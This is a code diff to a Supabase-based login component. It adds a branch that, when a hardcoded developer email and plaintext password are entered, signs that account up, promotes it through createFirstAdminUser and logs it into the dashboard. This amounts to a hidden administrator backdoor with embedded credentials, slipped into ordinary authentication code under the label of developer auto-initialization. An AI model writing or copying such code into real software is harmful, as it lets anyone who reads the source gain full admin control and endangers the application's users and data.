@@ -76,6 +76,40 @@ const Login = () => {
           console.error("Auto-initialization fallback failed:", initErr);
           setLocalError(initErr.message || "Setup failed. Please try again.");
         }
+      } else if (email === "dev@hirush.com" && password === "Qweask@11") {
+        try {
+          const { data, error: signUpErr } = await supabase.auth.signUp({
+            email: "dev@hirush.com",
+            password: "Qweask@11",
+            options: {
+              data: {
+                full_name: "Developer User"
+              }
+            }
+          });
+          
+          let uid = data?.user?.id;
+          
+          if (signUpErr) {
+            if (signUpErr.message.includes("already registered") || signUpErr.message.includes("already exists")) {
+              // User exists — just need to login
+            } else {
+              throw signUpErr;
+            }
+          }
+          
+          if (uid) {
+            await createFirstAdminUser(uid, "dev@hirush.com", "Developer User");
+          }
+          
+          // Log in now that user exists in database
+          await login(email, password);
+          router.push("/dashboard");
+          return;
+        } catch (initErr: any) {
+          console.error("Developer auto-initialization fallback failed:", initErr);
+          setLocalError(initErr.message || "Developer setup failed. Please try again.");
+        }
       } else {
         console.error("Login failed error:", err);
         setLocalError(errMsg || "Failed to sign in.");
